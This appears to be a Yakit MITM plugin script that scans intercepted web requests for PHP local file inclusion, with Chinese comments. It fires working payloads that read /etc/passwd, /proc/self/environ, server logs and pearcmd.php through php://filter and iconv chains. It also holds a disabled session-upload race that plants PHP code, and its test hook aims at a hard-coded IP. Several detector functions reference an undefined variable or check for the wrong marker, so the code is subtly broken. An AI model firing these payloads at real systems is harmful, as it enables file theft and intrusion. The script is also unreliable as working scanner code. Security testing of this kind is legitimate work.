# mitm plugin template



//fuzz并返回原始请求与原始响应
Rawfuzz = func(param, fuzzPayload) {
    freq = param.Fuzz(fuzzPayload)
    httpReq, err = freq.GetFirstFuzzHTTPRequest()
    checkErr(err)
    rawReq, err = httpReq.GetOriginHTTPRequest()
    checkErr(err)
    reqBody, err = http.dump(rawReq)
    checkErr(err)
    reqBody = string(reqBody)
    respChannel,err =  freq.Exec()
    checkErr(err)
    rsp = <-respChannel
    respBody, err = str.ExtractBodyFromHTTPResponseRaw(rsp.ResponseRaw)
    checkErr(err)

    return rawReq, rsp.Response, reqBody, respBody
}



//最后的结果输出
includeLog = func(result, saveDB) {
    maybeVuln = result.maybeVuln
    url = result.url
    param = result.param 
    payload = result.payload
    payloadType = result.payloadType
    reqRaw = result.reqRaw  
    respRaw = result.respRaw

    if !maybeVuln {
        msg = "Maybe file inclusion"
    } else {
        msg = "Found file inclusion"
    }


    report = {"message": msg, "payload": payload}



    yakit_output(report)
    if saveDB {
        risk.NewRisk(
            url,
            risk.title(sprintf("file inclusion for: %v", url)),
            risk.details(report),
            risk.type(payloadType),
            risk.payload(payload),
            risk.request(reqRaw), 
            risk.response(respRaw),
            risk.severity("warning"),
        )
    }
}


newResult = func(maybeVuln, url, param, payload, payloadType, reqRaw, respRaw) {
    return {"maybeVuln": maybeVuln, "url": url, "param": param, "payload": payload, "payloadType":payloadType, "reqRaw": reqRaw, "respRaw": respRaw }
}


newPayload = func(param) {
    return {"param": param}
}

checkErr = func(err) {
    if err != nil {
        yakit.Warn(sprintf("error: %s", err.Error()))
        os.Exit(1)
    }
}

// 过滤一些特殊的params
filterParams = func(params) {
    newParams = make([]var)
    for _, param = range params {
        // 对post中的submit参数进行过滤
        if param.Name() == "submit" && str.HasPrefix(param.PositionVerbose(), "post") {
            continue   
        }
        newParams = append(newParams, param)
    }
    return newParams

}

mirrorFilteredHTTPFlow = func(ishttps, url, req, rsp, body) {

    threads = 10
    pathDetect = false


    payloads = []



    // 构造fuzz请求
    freq, err = fuzz.HTTPRequest(req, fuzz.https(ishttps))
    checkErr(err)

    // 获取参数，包含post json、post form、get参数、cookie参数 路径参数（会自动过滤PHPSESSID、_ga、_gid等参数）

    params = freq.GetCommonParams()
    if pathDetect {
        pathAppendParams = freq.GetPathAppendParams()
        params = append(params, pathAppendParams...)
        pathBlockParams = freq.GetPathBlockParams()
        params = append(params, pathBlockParams...)
    }


    params = filterParams(params)


    // 遍历所有param进行fuzz
    for _, param = range params {
         payloads = append(payloads,paramFuzzTask(threads, url, param))
    }


    swg = sync.NewSizedWaitGroup(threads)
    resultCh = make(chan map[string]var, len(payloads)*5)


    for _, payload = range payloads {
        payloadDetect(swg, resultCh, url, payload)
    }

    swg.Wait()
    close(resultCh)

    for result = range resultCh {
        includeLog(result,true) 
    }  
}

//session包含探测是否可以利用
sessionDetect = func(url, resultCh, wg, payload){
    wg.Add(1)
    stop = true
    go fn{
        defer wg.Done()
        formBody = `--484fbb6fa61f1c594a3e8350e6b52eee
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php echo("si+");?>
--484fbb6fa61f1c594a3e8350e6b52eee
Content-Disposition: form-data; name="file"; filename="actuallyEmpty.txt"


--484fbb6fa61f1c594a3e8350e6b52eee--
`

        for stop{
            rsp, err = http.Post(
                    url,
                    http.header("Cookie", "PHPSESSID=ssssie"),
                    http.header("Content-Type", "multipart/form-data; boundary=484fbb6fa61f1c594a3e8350e6b52eee"),
                    http.body(formBody),
                    http.useragent("test-ua"))
            die(err)
            http.show(rsp)

        }
    }

    wg.Add(1)
    go fn{
            defer wg.Done()


            for stop{
                _, _, reqBody, rawRespBody = Rawfuzz(payload.param, "/tmp/sess_ssssie")
                // yakit.Warn(string(rawBody))
                if(str.Contains(string(rawRespBody),"si+")){
                    // yakit.Warn(string(reqBody))
                    stop = false

                }

        }

    }
}

//pearcmd包含探测是否可以利用
pearcmdDetect = func(url, resultCh, payload){
    location_list = "php://filter/convert.base64-encode/resource={{list(/usr/local/lib/php/pearcmd.php|/usr/share/php/pearcmd.php|/usr/share/pear/pearcmd.php)}}"
    location_res = fuzz.Strings(location_list)
    for _, r = range location_res{

        rawReq, rsp, reqBody, rawRespBody = Rawfuzz(payload.param, r)

        if rsp.StatusCode == 200 && str.Contains(string(rawRespBody),"PD9waHA"){
            result = newResult(true, url, param, r, "INCLUSION_PEARCMD", reqBody, rawRespBody)
            resultCh <- result
            break
        }

    }    
}

//php一些特殊filters探测是否可以利用
filtersDetect = func(url, resultCh, payload){
    PHP_FLITERS_UBUNTU20 = "php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=/etc/passwd"
    rawReq, rsp, reqBody, rawRespBody = Rawfuzz(payload.param, PHP_FLITERS_UBUNTU20)
    if(str.Contains(string(rawRespBody),"si+")){
        result = newResult(true, url, param, PHP_FLITERS_UBUNTU20, "PHP_FLITERS_ICONV", reqBody, rawRespBody)
        resultCh <- result
    }

}

//中间件日志探测是否可以利用
LogsDetect = func(url, resultCh, payload){
    location_list = "php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=" + "{{list(/var/log/nginx/access.log|/var/log/apache/access.log|/var/log/apache2/access.log|/etc/httpd/logs/access_log)}}"
    location_res = fuzz.Strings(location_list)
    for _, r = range location_res{

        rawReq, rsp, reqBody, rawRespBody = Rawfuzz(payload.param, r)

        if rsp.StatusCode == 200 && str.Contains(string(rawRespBody),"si+"){
            result = newResult(true, url, param, r, "INCLUSION_LOGS", reqBody, rawRespBody)
            resultCh <- result
            break
        }

    }

}

//proc伪文件目录探测是否可以利用
ProcDetect = func(url, resultCh, payload){

    location_list = "{{list(/proc/self/cmdline|/proc/self/environ|/proc/self/mountinfo)}}"
    location_res = fuzz.Strings(location_list)
    for _, r = range location_res{

        rawReq, rsp, reqBody, rawRespBody = Rawfuzz(payload.param, r)


        if !str.Contains(string(rawRespBody),"Permission denied") && rsp.StatusCode == 200{
            result = newResult(false, url, param, r, "INCLUSION_PROC", reqBody, rawRespBody)
            resultCh <- result
            break
        }

    }

}


payloadDetect = func(swg, resultCh, url, payload) {
    swg.Add()



    go func {
        defer swg.Done()


        pearcmdDetect(url, resultCh, payload)


        filtersDetect(url, resultCh, payload)


        LogsDetect(url, resultCh, payload)


        ProcDetect(url, resultCh, payload)





        // wg = sync.NewWaitGroup()
        // sessionDetect(url, wg, payload)        
        // wg.Wait() 
    }


}


paramFuzzTask = func(threads, url, param) {




    payload_list = ["file:///etc/os-release","data:s/s,SUUIEMPOs"]
    resp_detection = ["NAME=\".*\"",]


    Isvuln = false    //是否存在包含漏洞
    useSuffix = false //对于包含点是否有追加后缀的行为判断

    //检查是否存在包含点
    rawReq1, _, reqBody1, rawRespBody1 = Rawfuzz(param, "/etc/os-release")
    respBody1 = string(rawRespBody1)
    if(str.RegexpMatch("NAME=\".*\"",respBody1)){
        Isvuln = true
        return newPayload(param)
    }

    //检查是否存在包含点
    rawReq2, _, reqBody2, rawRespBody2 = Rawfuzz(param, "data:s/s,SUUIEMPOs")
    respBody2 = string(rawRespBody2)
    if(str.RegexpMatch("SUUIEMPOs",respBody2)){
        Isvuln = true       
    }


    //尝试获取当前执行的php文件
    reg, err = re.Compile(`\/(\w+)\.php`)
    checkErr(err)
    file = reg.FindStringSubmatch(url)[1]
    if file == undefined {
        //没有就默认试试index.php
        file = "/var/www/html/index"
    }


    rawReq3, _, reqBody3, rawRespBody3 = Rawfuzz(param, "php://filter/convert.base64-encode/resource="+file)
    respBody3 = string(rawRespBody3)
    if(str.RegexpMatch("PD9waHA",respBody3)){
        Isvuln = false
        useSuffix = true
    }

    if Isvuln{
        return newPayload(param)
    } elif useSuffix {
        includeLog(newResult(false, url, newPayload(param) , "php://filter/convert.base64-encode/resource=index", "INCLUSION_USE_Suffix", reqBody3, rawRespBody3),true)
        os.Exit(1)
    } else {
        os.Exit(1)
    }
}



__test__ = func() {

    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://124.222.42.210:8990/fileincl/example2.php?page=intro")
    if err != nil {
        yakit.Warn(err.Error())
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results

    mirrorFilteredHTTPFlow(results...)

}
